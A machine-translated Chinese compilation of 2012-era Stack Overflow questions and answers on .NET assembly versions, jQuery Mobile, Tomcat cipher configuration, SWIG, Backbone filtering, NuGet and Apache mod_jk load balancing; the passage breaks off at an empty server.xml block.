在 Visual Studio 属性窗口中，一个 dll 有一个给定的版本。并且在 OS 文件系统中给出了另一个版本号。有没有办法在文件系统或其他方式中查看 Visual Studio 中显示的相同版本。因为有了缓存预览安装生活变得非常非常困难！！！视觉效果[请点击这里](http://azuretable.blogspot.nl/2012/08/azure-version-conflict-sucks.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:41:01.990

是的，这是因为文件系统显示**[Assembly File Version](http://msdn.microsoft.com/en-us/library/system.reflection.assemblyfileversionattribute.aspx)**而 Visual Studio 显示**[Assembly Version](http://msdn.microsoft.com/en-us/library/system.reflection.assemblyversionattribute.aspx)**。有关差异的更多信息，请参阅此问题：[AssemblyVersion、AssemblyFileVersion 和 AssemblyInformationalVersion 之间有什么区别？](https://stackoverflow.com/questions/64602/what-are-differences-between-assemblyversion-assemblyfileversion-and-assemblyin)

例如，如果您使用 DotPeek 打开程序集，您将看到两个属性都已定义：

```
[assembly: CLSCompliant(true)]
[assembly: ComVisible(false)]
[assembly: AssemblyProduct("Windows Azure SDK")]
[assembly: InternalsVisibleTo("Microsoft.WindowsAzure.InternalAccessor, PublicKey=0024000004800000940000000602000000240000525341310004000001000100b5fc90e7027f67871e773a8fde8938c81dd402ba65b9201d60593e96c492651e889cc13f1415ebb53fac1131ae0bd333c5ee6021672d9718ea31a8aebd0da0072f25d87dba6fc90ffd598ed4da35e44c398c454307e8e33b8426143daec9f596836f97c8f74750e5975c64e2189f45def46b2a2b1247adc3652bf5c308055da9")]
[assembly: AllowPartiallyTrustedCallers]
[assembly: SecurityTransparent]
[assembly: NeutralResourcesLanguage("en-US")]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Extension]
[assembly: InternalsVisibleTo("StorageClientConvenienceTests, PublicKey=0024000004800000940000000602000000240000525341310004000001000100b5fc90e7027f67871e773a8fde8938c81dd402ba65b9201d60593e96c492651e889cc13f1415ebb53fac1131ae0bd333c5ee6021672d9718ea31a8aebd0da0072f25d87dba6fc90ffd598ed4da35e44c398c454307e8e33b8426143daec9f596836f97c8f74750e5975c64e2189f45def46b2a2b1247adc3652bf5c308055da9")]
[assembly: InternalsVisibleTo("Microsoft.WindowsAzure.CloudDrive, PublicKey=0024000004800000940000000602000000240000525341310004000001000100b5fc90e7027f67871e773a8fde8938c81dd402ba65b9201d60593e96c492651e889cc13f1415ebb53fac1131ae0bd333c5ee6021672d9718ea31a8aebd0da0072f25d87dba6fc90ffd598ed4da35e44c398c454307e8e33b8426143daec9f596836f97c8f74750e5975c64e2189f45def46b2a2b1247adc3652bf5c308055da9")]
[assembly: AssemblyCompany("Microsoft Corporation")]
---> HERE: [assembly: AssemblyFileVersion("6.0.6002.18488")]
[assembly: InternalsVisibleTo("Microsoft.WindowsAzure.StorageClient.Internal, PublicKey=0024000004800000940000000602000000240000525341310004000001000100b5fc90e7027f67871e773a8fde8938c81dd402ba65b9201d60593e96c492651e889cc13f1415ebb53fac1131ae0bd333c5ee6021672d9718ea31a8aebd0da0072f25d87dba6fc90ffd598ed4da35e44c398c454307e8e33b8426143daec9f596836f97c8f74750e5975c64e2189f45def46b2a2b1247adc3652bf5c308055da9")]
[assembly: AssemblyCopyright("Copyright (c) Microsoft Corporation. All rights reserved.")]
[assembly: InternalsVisibleTo("StorageClientProtocolTests, PublicKey=0024000004800000940000000602000000240000525341310004000001000100b5fc90e7027f67871e773a8fde8938c81dd402ba65b9201d60593e96c492651e889cc13f1415ebb53fac1131ae0bd333c5ee6021672d9718ea31a8aebd0da0072f25d87dba6fc90ffd598ed4da35e44c398c454307e8e33b8426143daec9f596836f97c8f74750e5975c64e2189f45def46b2a2b1247adc3652bf5c308055da9")]
[assembly: InternalsVisibleTo("StorageClientProtocolBillingTests, PublicKey=0024000004800000940000000602000000240000525341310004000001000100b5fc90e7027f67871e773a8fde8938c81dd402ba65b9201d60593e96c492651e889cc13f1415ebb53fac1131ae0bd333c5ee6021672d9718ea31a8aebd0da0072f25d87dba6fc90ffd598ed4da35e44c398c454307e8e33b8426143daec9f596836f97c8f74750e5975c64e2189f45def46b2a2b1247adc3652bf5c308055da9")]
[assembly: InternalsVisibleTo("Microsoft.WindowsAzure.Diagnostics, PublicKey=0024000004800000940000000602000000240000525341310004000001000100b5fc90e7027f67871e773a8fde8938c81dd402ba65b9201d60593e96c492651e889cc13f1415ebb53fac1131ae0bd333c5ee6021672d9718ea31a8aebd0da0072f25d87dba6fc90ffd598ed4da35e44c398c454307e8e33b8426143daec9f596836f97c8f74750e5975c64e2189f45def46b2a2b1247adc3652bf5c308055da9")]
[assembly: InternalsVisibleTo("Microsoft.WindowsAzure.Diagnostics.Internal, PublicKey=0024000004800000940000000602000000240000525341310004000001000100b5fc90e7027f67871e773a8fde8938c81dd402ba65b9201d60593e96c492651e889cc13f1415ebb53fac1131ae0bd333c5ee6021672d9718ea31a8aebd0da0072f25d87dba6fc90ffd598ed4da35e44c398c454307e8e33b8426143daec9f596836f97c8f74750e5975c64e2189f45def46b2a2b1247adc3652bf5c308055da9")]
---> HERE: [assembly: AssemblyVersion("1.7.0.0")] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-13T09:44:49.917

为了补充上面提到的内容，如果程序集是标准程序集或来自以标准方式使用 AssemblyVersion 和 AssemblyFileVersion 的人，如果两者的主要和次要版本匹配，则您正在查看相同的程序集。例如，如果您将 1.2.34.45 作为资源管理器中可见的 AssemblyFileVersion 并将 1.2 作为属性窗口中的 AssemblyVersion，则它可能是同一个文件。

# c# - 通过 Metro DynamicResource 在 Windows 8 中启动屏幕的颜色？

> ID：12192610
> 
> 赞同：1
> 
> 时间：2012-08-30T08:14:41.173
> 
> 标签：c#, xaml, windows-runtime, windows-store-apps, winrt-xaml

我在以下路径中查看了 Generic.xaml 和 ThemeResources.xaml：

> C:\Program Files (x86)\Windows Kits\8.0\Include\WinRT\Xaml\Design

但是，它们似乎不包含我可以用来检索在 Windows 8 开始屏幕中选择的当前方案的颜色的资源键。

我试图通过 XAML 中的 DynamicResource 检索的颜色如下所示，以证明我的观点。

![我试图检索的颜色](../Images/36056a3ed0823dadb27272c65c5710b5.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T14:47:55.623

没有 API 可用于使用当前选定的 Windows 主题颜色。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-27T13:11:59.590

是的，不幸的是没有 API。这个解决方法怎么样？

[http://blog.quppa.net/2013/01/02/retrieving-windows-8-theme-colours/](http://blog.quppa.net/2013/01/02/retrieving-windows-8-theme-colours/)

# .net-3.5 - 支持 .Net 3.5 的最新版 StructureMap 是什么？

> ID：12192612
> 
> 赞同：5
> 
> 时间：2012-08-30T08:14:58.470
> 
> 标签：.net-3.5, structuremap

我想使用最新版本，但不能使用任何依赖于 .Net 4.0 或更新版本的新项目。

我看过[这个问题](https://stackoverflow.com/questions/5008346/what-is-the-latest-version-of-structuremap-that-supports-net-2-0 "这个问题")，所以我知道我至少可以使用 2.4.9 版本，但是我可以使用任何更新的版本吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T11:03:19.420

在我从事的 .Net 3.5 项目中，我使用结构映射 2.6.3。我用 NuGet 添加了引用。无法通过 NuGet 在 3.5 项目上安装 2.6.4 和 2.6.4.1 版本，但 2.6.3 可以。

```
install-package structuremap -Version 2.6.3 
```

# javascript - jQuery Mobile: Swipeleft/Swiperight is jumping itself

> ID：12192614
> 
> 赞同：2
> 
> 时间：2012-08-30T08:15:02.020
> 
> 标签：javascript, jquery, events, jquery-mobile, swipe

i use this code to react on the swipeleft/swiperight event:

```
$('body').live('pagecreate', function(event) {
    $('div[data-role="page"]').live("swipeleft", function() {
        var nextpage = $(this).next('div[data-role="page"]');
        // swipe using id of next page if exists
        if (nextpage.length > 0) {
            $.mobile.changePage(nextpage);
        }
    });
    $('div[data-role="page"]').live("swiperight", function() {
        var prevpage = $(this).prev('div[data-role="page"]');
        // swipe using id of previous page if exists
        if (prevpage.length > 0) {
            $.mobile.changePage(prevpage, {
                reverse : true,
            });
        }
    });
}); 
```

It works, but after about 3 swipes (maybe when i reach the end of the 4 pages) there´s no normal behaviour anymore. For example: I swipe left --> i get the nextpage but then it swipes back and then again (i reach the expected page but not in that case i want). That happens after about 3 swipes all the time. What´s wrong with the code?

Thx a lot!

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T08:31:11.353

你知道有一个来自 JQM 开发者的插件就是为了这个：[JQM 分页](http://filamentgroup.com/lab/jquery_mobile_pagination_plugin/)

我认为您的问题与多个绑定有关。

在每个绑定中放置一个`console.log`以查看它触发的频率。像这样：

```
$('body').live('pagecreate', function(event) {
console.log( "PAGECREATE fired")
$('div[data-role="page"]').live("swipeleft", function() {
    console.log("binding to swipe-left on "+$(this).attr('id') );
    var nextpage = $(this).next('div[data-role="page"]');
    // swipe using id of next page if exists
    if (nextpage.length > 0) {
        $.mobile.changePage(nextpage);
    }
});
$('div[data-role="page"]').live("swiperight", function() {
    console.log("binding to swipe-right "+$(this).attr('id');
    var prevpage = $(this).prev('div[data-role="page"]');
    // swipe using id of previous page if exists
    if (prevpage.length > 0) {
        $.mobile.changePage(prevpage, {
            reverse : true,
        });
    }
});
}); 
```

如果这些触发不止一次，您将在页面上附加多个绑定，这将在滑动时`all`触发`changePage`，而您只想`one`在每次滑动时触发事件。

**编辑：**
首先，如果您使用的是最新的 Jquery，您应该使用绑定`on/off`并且不再使用`live`。一种方法是在重新加载页面时`unbind`打开`pagehide`并重新`bind`启动。我想这将是推荐的方式。但是，如果您在滑动到下一页时没有从 DOM 中删除页面，您将解除绑定，并且由于`pagecreate`不会再次触发（页面仍在 DOM 中，无需创建），因此`bind`当您向后滑动时不会再次触发。

我也经常处理这个问题并且正在使用这个：

```
$(document).on('pageshow', 'div:jqmData(role="page")', function(){

     var page = $(this), nextpage, prevpage;

     // check if the page being shown already has a binding
      if ( page.jqmData('bound') != true ){
            // if not, set blocker
            page.jqmData('bound', true)
            // bind
                .on('swipeleft.paginate', function() {
                    console.log("binding to swipe-left on "+page.attr('id') );
                    nextpage = page.next('div[data-role="page"]');
                    if (nextpage.length > 0) {
                        $.mobile.changePage(nextpage);
                        }
                    })
                .on('swiperight.paginate', function(){
                    console.log("binding to swipe-right "+page.attr('id');
                    prevpage = page.prev('div[data-role="page"]');
                    if (prevpage.length > 0) {
                        $.mobile.changePage(prevpage, {
                            reverse : true,
                            });
                        };
                     });
            }
        }); 
```

这将触发 every`pageshow`并检查页面是否为`bound`. 如果没有，它会在此页面上设置绑定。下一次`pageshow`火`bound`将是真实的，所以它不会重新绑定。如果页面从 DOM 中删除并重新加载，`bound`则不会设置并且绑定将被重置。

我还添加`.paginate`到您的 swipeleft/swiperight 中，这样您就可以使用`off`

# java - Tomcat 中的 JSSE 配置 - 启用 AES256 密码

> ID：12192616
> 
> 赞同：3
> 
> 时间：2012-08-30T08:15:10.530
> 
> 标签：java, tomcat, encryption, jsse

Apache Tomcat 服务器中的 JSSE 支持哪些密码？如何启用 AES256 并重新排序密码？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2015-03-30T20:18:40.537

# HOWTO：让 Tomcat 使用 256 位 AES（和其他算法密码）

1）很可能您现在没有安装无限强度文件。

您可能需要下载此文件：

Java Cryptography Extension (JCE) Unlimited Strength Jurisdiction Policy Files 7 下载 [http://www.oracle.com/technetwork/java/javase/downloads/jce-7-download-432124.html](http://www.oracle.com/technetwork/java/javase/downloads/jce-7-download-432124.html)

将文件安装在

```
${java.home}/jre/lib/security/ 
```

2) 编辑您的 server.xml 文件并仅输入 256 位密码：

示例：仅 W/256

```
<Connector port="8443" protocol="HTTP/1.1" SSLEnabled="true"
maxThreads="150" scheme="https" secure="true"
keystoreFile="keystore.p12"
keystorePass="<MY_PASSWORD>" keystoreType="PKCS12"
clientAuth="want" sslProtocol="TLS"
sslEnabledProtocols="TLSv1.2,TLSv1.1,TLSv1" 
ciphers="ECDHE_RSA_WITH_AES_256_CBC_SHA384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
TLS_RSA_WITH_AES_256_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA" /> 
```

示例：W/ 256 和 128

```
<Connector port="8443" protocol="HTTP/1.1" SSLEnabled="true"
maxThreads="150" scheme="https" secure="true"
keystoreFile="keystore.p12"
keystorePass="<MY_PASSWORD>" keystoreType="PKCS12"
clientAuth="want" sslProtocol="TLS"
sslEnabledProtocols="TLSv1.2,TLSv1.1,TLSv1" ciphers="TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_RSA_WITH_RC4_128_SHA,
TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA256,
TLS_RSA_WITH_AES_256_CBC_SHA,SSL_RSA_WITH_RC4_128_SHA" /> 
```

3）重新启动tomcat并点击主要的默认tomcat页面：

```
https://localhost:8443/ 
```

参考：

= = = = = = = = = = = = =

[Java 安全性：非法密钥大小或默认参数？](https://stackoverflow.com/questions/6481627/java-security-illegal-key-size-or-default-parameters)

[java aes 256 java.security.InvalidKeyException：安装策略后密钥大小非法](https://stackoverflow.com/questions/20802380/java-aes-256-java-security-invalidkeyexception-illegal-key-size-after-installat)

[http://tomcat.apache.org/tomcat-7.0-doc/config/http.html#SSL_Support__-_BIO_and_NIO](http://tomcat.apache.org/tomcat-7.0-doc/config/http.html#SSL_Support_-_BIO_and_NIO)

[http://www.iana.org/assignments/tls-parameters/tls-parameters.xml#tls-parameters-4](http://www.iana.org/assignments/tls-parameters/tls-parameters.xml#tls-parameters-4)

[http://www.iana.org/assignments/tls-parameters/tls-parameters-4.csv](http://www.iana.org/assignments/tls-parameters/tls-parameters-4.csv)

[http://blog.bitmelt.com/2013/11/tomcat-ssl-hardening.html](http://blog.bitmelt.com/2013/11/tomcat-ssl-hardening.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T21:59:24.463

如果您不使用 APR 本机连接器，Tomcat 支持 Java 支持的任何内容，其中包括 AES256，可能需要无限强度的加密 JAR。

如果您使用本机 APR，则 Tomcat 支持其 OpenSSL 支持的任何内容，您可以通过 OpenSSL.exe 命令以某种方式确定。

启用的密码套件应该可以在 server.xml 的 Connector 元素中进行配置。

# sharepoint - Outlook 2010 Add-in

> ID：12192619
> 
> 赞同：2
> 
> 时间：2012-08-30T08:15:22.657
> 
> 标签：sharepoint, sharepoint-2010, outlook-addin, exchangewebservices, outlook-2010

I am writing custom code in Outlook Add-in using SharePoint Web Services to create a meeting workspace in SharePoint. Then I add a meeting to the workspace created. Basically I want to mimic the functionality provided by Outlook itself.

The problem is after a meeting is created, I can not set the `MeetingWorkspaceUrl` property in `AppointmentItem` using my custom code. It says the property is read only. But when I create a workspace using default Outlook functionality, I can see that `MeetingWorkspaceUrl` is set to a valid URL.

Can I do the same thing through custom code?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T12:54:50.560

[`MeetingWorkspaceUrl`](http://msdn.microsoft.com/en-us/librAry/ff869948) [**在Outlook API**](http://help.wugnet.com/office/Settings-MeetingWorkspaceURL-property-ftopict946960.html)[中是只读的](http://help.wugnet.com/office/Settings-MeetingWorkspaceURL-property-ftopict946960.html)，您需要使用**EWS** ( *[`AppointmentItem.MeetingWorkspaceUrl`](http://msdn.microsoft.com/en-us/LIBRary/microsoft.exchange.webservices.data.appointment.meetingworkspaceurl%28v=exchg.80%29)*) 来分配其值。

# backbone.js - 下划线 - 过滤一组值

> ID：12192621
> 
> 赞同：2
> 
> 时间：2012-08-30T08:15:33.030
> 
> 标签：backbone.js, underscore.js

我有一个收藏`self.models`。我还有一个对象数组，其中包含我希望应用于我的集合的字段和过滤器，称为`filterArr`. 这方面的一个例子是：

```
[{field: "Account", filter: "123"}, {field: "Owner", filter: "Bob"}] 
```

问题是，我不太确定如何遍历每个模型以仅返回那些也`filterArr`适用的模型，我知道它必须是这样的，但这是硬编码的：

```
self.models = _.filter(self.models, function (model) {
                    model = model.toJSON();
                    return model.Account === "123" && model.Owner === "Bob";

}); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-30T09:32:56.923

首先，下划线的过滤器返回一个`Array`，所以你在这里有效地做的是用一个过滤的数组替换你的集合。像这样的东西会更合适：

```
this.filtered = _.filter(this.models, ...); 
```

Backbone Collection 实现了[underscore 的大部分有用功能](http://backbonejs.org/#Collection-Underscore-Methods)。因此，上面的解决方案远非最佳（实际上它并不能完全按照您想要的方式工作），而是执行以下操作：

```
this.filtered = this.models.filter(function() {...}); 
```

到目前为止，按名称获取和设置模型字段的最佳方法是 Backbone的`get`和`set` [函数](http://backbonejs.org/#Model-get)`Model`，那么为什么不使用它们呢？`Model.toJSON()`有效，但您只是在`attributes`不必要地复制 -hash。

```
this.filterObj = { // Why not make it an object instead of array of objects
  "Account": "123",
  "Owner": "Bob"
};
this.filtered = this.models.filter(function(model) {
  // use the for in construct to loop the object
  for (filter in filterObj) {
    // if the model doesn't pass a filter check, then return false
    if (model.get(filter) !== filterObj[filter]) return false;
  }
  // the model passed all checks, return true
  return true;
}); 
```

希望这可以帮助！

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-30T09:28:01.307

基本上，您需要遍历模型的属性并将它们的键和值与过滤器的属性进行比较。

```
self.models = _.filter(self.models, function (model) {
  var fits = true; // does this model "fit" the filter?
  model = model.toJSON();
  _.each(model, function(modelVal, modelKey) {
     _.each(filterArr, function(filter) {
        if (modelKey === filter.field && modelVal !== filter.filter) {
           fits = false
        }
     }
  })
  return fits
}) 
```

然而，有一点下划线魔法有一个更棘手的方法。我不确定它在性能方面是否更好，但在我看来它肯定看起来更好。

```
 // change a bit the way filter is described:
var filter = {Account: '123', Owner: 'Bob'},
    // save an array of filter keys (Account, Owner)
    filterKeys = _.keys(filter),
    // and an array of its values (123, Bob)
    filterVals = _.values(filter)
self.models = _.filter(self.models, function (model) {
      // pick a subset of model which has the same keys as filter
  var filteredSubset = _.pick(model.attributes, filterKeys),
      // pick values of this subset
      subsetValues = _.values(filteredSubset)
      // this values have to be equal to filter's values
      // (use .join() to turn array to string before comparison due to references)
      return filteredVals.join() === subsetValues.join()
}) 
```

请注意，在后一种情况下，所有模型都必须在过滤器中声明所有键。

如果我是你并且我正在寻找一种最稳健的方法，我会重写第一个示例，但会更改`_.each`为标准`for`循环并`false`在满足第一个“不合适”值时立即返回。

# java - Swig：将返回类型 std::string(binary) 转换为 java byte[]

> ID：12192624
> 
> 赞同：4
> 
> 时间：2012-08-30T08:15:40.310
> 
> 标签：java, swig

我的情况是我有一个 C++ 类（MyClass），其方法具有以下签名：

```
bool getSerialized(const stdString & name, std::string & serialized); 
```

其中 name 是一个 in 参数，而 serialized 是一个 out 参数。

我通过在“i”文件中进行 %extend 和 %ignore 声明使其工作，如下所示：

```
%extend MyClass{
    std::string getSerialized(const std::string & name){
        std::string res;
        $self->getSerialized(name, res);
        return res;
};
%rename("$ignore", fullname=1) "MyClass::getSerialized"; 
```

所以方法 con 可以从 Java 中使用，例如：

```
MyClass mc = new MyClass();
String res = mc.getSerialized("test"); 
```

但是现在我遇到了一个问题，序列化的 std::string 包含二进制数据，包括 '\0' 字符女巫表示 C 字符串的结尾，实际上以下代码显示了 C++ 中的问题：

```
std::string s;
s.push_back('H');
s.push_back('o');
s.push_back(0);
s.push_back('l');
s.push_back('a');
std::cout << "Length of std::string " << s.size() << std::endl;
std::cout << "CString: '" << s.c_str() << "'" << std::endl; 
```

上面的代码显示：

```
Length of std::string 5
CString: 'Ho' 
```

正如我在 SWIG 生成的 wrap 文件中看到的，wrap 方法实际上调用了 c_str()，wrap 的代码：

```
jstring jresult = 0 ;
std::string result;
result = (arg1)->getSerialized();
jresult = jenv->NewStringUTF((&result)->**c_str()**); 
return jresult; 
```

因此，正如预期的那样，Java 中收到的 String 会被截断。那么我如何更改（大概）我的 %extend 函数包装器，以便我可以将其作为字节数组（byte []）返回，而无需事先知道数组的长度。如果可以在 SWIG 层中创建 byteArray 那就太好了，这样我就可以从 Java 调用该方法，例如：

```
byte[] serialized = mc.getSerialized("test"); 
```

[其他注意事项：给出了使用 std::string 存储二进制数据，以及使用 Google protobuf 库C++ protobuf 用法](https://developers.google.com/protocol-buffers/docs/cpptutorial)的返回类型

有一个非常相似的问题，包括标题[Swig: convert return type std::string to java byte[]](https://stackoverflow.com/questions/4937979/swig-convert-return-type-stdstring-to-java-byte?answertab=active#tab-top)但是没有二进制数据的情况，所以这里给出的解决方案不适用。

使用 SWIG 2。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T12:08:15.043

您可以使用一些类型映射和一些 JNI 来做您想做的事情。我整理了一个例子：

```
%module test

%include <std_string.i>

%typemap(jtype) bool foo "byte[]"
%typemap(jstype) bool foo "byte[]"
%typemap(jni) bool foo "jbyteArray"
%typemap(javaout) bool foo { return $jnicall; }
%typemap(in, numinputs=0) std::string& out (std::string temp) "$1=&temp;"
%typemap(argout) std::string& out {
  $result = JCALL1(NewByteArray, jenv, $1->size());
  JCALL4(SetByteArrayRegion, jenv, $result, 0, $1->size(), (const jbyte*)$1->c_str());
}
// Optional: return NULL if the function returned false
%typemap(out) bool foo {
  if (!$1) {
    return NULL;
  }
}

%inline %{
struct Bar {
  bool foo(std::string& out) {
    std::string s;
    s.push_back('H');
    s.push_back('o');
    s.push_back(0);
    s.push_back('l');
    s.push_back('a');
    out = s;
    return true;
  }
};
%} 
```

它声明 C++ 包装器为匹配的函数返回一个 Java 字节数组`bool foo`。它还`std::string`为真正的实现设置了一个临时对象，该实现`foo`对 Java 接口本身隐藏了输入参数。

一旦调用完成，它就会创建并返回一个字节数组，前提是该函数没有返回 false。

我检查了它是否按预期工作：

```
public class run { 
  public static void main(String[] argv) {
    String s = "ho\0la";
    System.out.println(s.getBytes().length);

    System.loadLibrary("test");
    Bar b = new Bar();
    byte[] bytes = b.foo();
    s = new String(bytes);
    System.out.println(s + " - " + s.length());
    assert(s.charAt(2) == 0);
  }
} 
```

您应该意识到`const jbyte*`从返回类型转换为的含义`c_str()`- 它可能并不总是您想要的。

作为替代方案，如果输出字节数组的大小实际上是固定的或可以轻松预测，您可以将其传递为预先分配的作为开始的输入。这会起作用，因为数组首先通过引用有效地传递给函数。

# javascript - 查询。查找具有与之关联的特定数据（）的 div

> ID：12192627
> 
> 赞同：0
> 
> 时间：2012-08-30T08:15:58.790
> 
> 标签：javascript, jquery

使用该`data()`函数，我将两个值添加到一些`divs`（`$oRow`指向 div）

```
$oRow.data("more", {moreValue: 750, moreIndex: 4}); 
```

后来我试图找到`div`（只有一个）具有特定价值的`moreIndex`

我这样做是这样的：

```
$oMore = $(".meter_battery_row").filter(function(){
                   return $.data(this, "more").moreIndex == 4;
                   }); 
```

但这似乎不起作用。在上面的行之后我显示`window.alert($oMore)`但它似乎没有到达这一行，所以它在过滤器函数中运行某种问题。

有人有什么想法吗？

**编辑**

`.meter_battery_row`是`divs`我附加数据值的类。（`$oRow`属于类`.meter_battery_row`）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:21:25.050

```
$('div.meter_battery_row[data-moreIndex="4"]') does not help you ? 
```

通常，该函数会将自定义值作为前缀属性`.data()`添加到您的 div 中。`data-...`

您可以使用[属性选择器](http://api.jquery.com/attribute-equals-selector/)来获取您指定的 div。

检查您尝试使用 firebug 选择的元素，您会看到您的 moreIndex 已保存为 div 元素的属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:25:20.213

您可以添加它 data- 属性，以便您可以在之后更轻松地检索它并且仍然使用`$.fn.data()`：

```
$oRow.attr('data-moreIndex', 4).attr('data-moreValue', 750);
// ...
$oMore = $('.meter_battery_row[data-moreIndex="4"]'); 
```

这是[一个活生生的例子](http://jsfiddle.net/Calou/Qjyhz/4/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T08:26:48.747

第一次检查`$.data(this, "more")`

```
return  ($.data(this, "more") && $.data(this, "more").moreIndex == 4); 
```

否则，当并非所有元素都有更多数据并且过滤停止时，您将收到错误消息。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-30T08:27:15.097

问题是，当您调用`$.data(this, "more")`只有一个元素会返回 object`{moreValue: 750, moreIndex: 4}`时，其余元素将返回 undefined。那么当你打电话时，`undefined.moreIndex`你会得到一个错误。尝试这样做：

```
 return $.data(this, "more") && $.data(this, "more").moreIndex == 4; 
```

# browser - 更改 sencha touch 2 的浏览器

> ID：12192629
> 
> 赞同：0
> 
> 时间：2012-08-30T08:16:06.967
> 
> 标签：browser, sencha-touch-2, webgl

**我们正在使用Sencha Touch 2**和**PhoneGap 2.0**开发应用程序。我们还想使用**WebGL**。

但是安卓浏览器和 safari mobile 都不支持。

但是**Opera Mobile 12**支持**WebGL**。是否可以使用**Opera Mobile**启动煎茶应用程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T20:53:52.843

首先，PhoneGap 覆盖了原生 Android 浏览器的能力。我们不能使用 Opera Mobile 浏览器功能来开发 PhoneGap 应用程序。

其次，Opera Mobile 不支持 Sencha Touch。它仅在 WebKit 浏览器上运行。我不确定Mobile chrome。但是除了android默认浏览器之外的任何其他浏览器都无法运行sencha的所有功能。

希望你得到你的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T19:52:59.943

您可以尝试 RhoElements v1 浏览器。据我所知，它也只支持 WebKit。

[https://docs.symbol.com/ReleaseNotes/RE_0100001000_ReleaseNotes.html](https://docs.symbol.com/ReleaseNotes/RE_0100001000_ReleaseNotes.html)

[http://www.spritle.com/blogs/2012/01/04/rhodes-3-3-x-supports-motorola-rhoelements-and-android-et1/](http://www.spritle.com/blogs/2012/01/04/rhodes-3-3-x-supports-motorola-rhoelements-and-android-et1/)

# java - 实现连接池的正确方法

> ID：12192631
> 
> 赞同：1
> 
> 时间：2012-08-30T08:16:09.367
> 
> 标签：java, connection-pooling

我正在尝试编写一个`multithreading program`连接到 a`MySQL database`并处理返回集的查询（有数千行）。问题是我已经实现了连接池，并且我让每个线程都打开与数据库的连接并获取结果集。但是我不明白如果检索那个大集合需要这么多时间，那么使用连接池的优势是什么。`thread pooling`如果我只使用一个连接（不使用池）获得整个集合然后我用来处理它，那会不会更好？或者有没有办法让每个线程都获取结果集的下一行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:22:04.637

如果您的线程数量有限，我会为每个线程建立一个连接。

如果可以使用连接的线程数量过多并且这些线程使用连接的时间百分比相对较低，则连接池效率更高。

# visual-studio-2010 - Is it possible to have Nuget bind to two different packages based on build architecture

> ID：12192632
> 
> 赞同：5
> 
> 时间：2012-08-30T08:16:10.273
> 
> 标签：visual-studio-2010, msbuild, nuget, nuget-package

I have access to a nugget repository that has two different versions of a package, one 32bit and one 64bit.

My dev machine at work is 32 bit whereas the build server builds the solution in 64bit mode. Currently I'm controlling the build process with ItemGroup conditions, something a bit like this:

```
<ItemGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x64' "> 
```

It it possible to configure nuget to bind to one package when building in 32bit mode and the other in 64bit mode? Or am I stuck with manually editing the *proj files?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T20:05:37.327

恐怕MSBuild是现在要走的路。根据配置/平台条件，您可以在还原发生之前在预构建步骤中包含不同的 packages.config 文件，或转换 packages.config 文件的内容（使用占位符或其他东西）。

这让我觉得您甚至可以使用[SlowCheetah](http://visualstudiogallery.msdn.microsoft.com/69023d00-a4f9-4a34-a6cd-7e854ba318b5)在 packages.config 文件上应用这种 XML 转换？

# apache - Apache mod_jk 负载平衡不起作用但故障转移有效

> ID：12192636
> 
> 赞同：1
> 
> 时间：2012-08-30T08:16:22.723
> 
> 标签：apache, load-balancing, failover, mod-jk

我正在尝试使用 mod_jk 配置 Apache 负载平衡解决方案。集群工作但不是负载平衡。

我的笔记本电脑上运行着 Apache httpd 2.2 服务器。我有两个 VMWare 虚拟机客户操作系统。这三个都是窗户。VMware 机器托管服务于 Web 应用程序的 Apache Tomcat 服务器。我已经配置了带有 mod_jk 的 httpd.conf 文件和带有工人信息的工人属性文件。我可以使用 URL 访问我的 Web 应用程序：`http://localhost/Web-application`。如果我停止一台服务器，那么应​​用程序将从另一台服务器提供。但是，不能同时两者。部分摘录如下：

**httpd.conf 文件：**

```
LoadModule jk_module modules/mod_jk.so 
JkWorkersFile conf/workers.properties
JkLogFile "logs/mod_jk.log" 
JkLogLevel info
JkMount /MovieBooking loadbalancer
JkMount /MovieBooking/* loadbalancer 
```

**worker.properties 文件**

```
workers.tomcat_home=/worker1
workers.java_home=$JAVA_HOME
worker.list=loadbalancer,jkstatus,worker1,worker2

 #Declare Tomcat server workers 1 through n

worker.loadbalancer.type=lb
worker.loadbalancer.balance_workers=worker1,worker2
worker.loadbalancer.sticky_session=1

worker.worker1.type=ajp13
worker.worker1.host=192.168.200.244
worker.worker1.port=8109
worker.worker1.lbfactor=1

worker.worker2.type=ajp13
worker.worker2.port=8109
worker.worker2.host=192.168.200.243
worker.worker2.lbfactor=1

worker.jkstatus.type=status 
```

我还在这些服务器上的 server.xml 文件中设置了 jvmroute：

**服务器.xml**

```
